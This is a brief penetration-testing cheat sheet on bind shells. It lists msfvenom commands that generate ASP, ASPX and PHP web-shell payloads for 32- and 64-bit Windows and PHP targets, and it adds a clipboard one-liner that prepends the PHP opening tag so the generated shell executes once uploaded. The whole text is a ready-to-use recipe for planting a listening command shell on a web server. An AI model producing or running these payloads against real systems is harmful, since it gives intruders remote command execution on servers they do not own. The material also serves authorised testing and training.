# Bind Shells

## 01 - ASP

```
$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f asp -o shell-x86.asp

$ msfvenom -p windows/x64/shell_bind_tcp lport=<PORT> -f asp -o shell-x64.asp
```

## 02 - ASPX

```
$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f aspx -o shell-x86.aspx

$ msfvenom -p windows/x64/shell_bind_tcp lport=<PORT> -f aspx -o shell-x64.aspx
```

## 03 - PHP

PHP bind callback shell

```
$ msfvenom -p php/bind_php lhost=<IP> lport=<PORT> -f raw -o shell.php
```

PHP with perl code bind callback shell

```
$ msfvenom -p php/bind_perl lport=<PORT> -f raw -o shell.php
```

After generating the PHP reverse callback shell include the tags to ensure execution.

```
$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php
```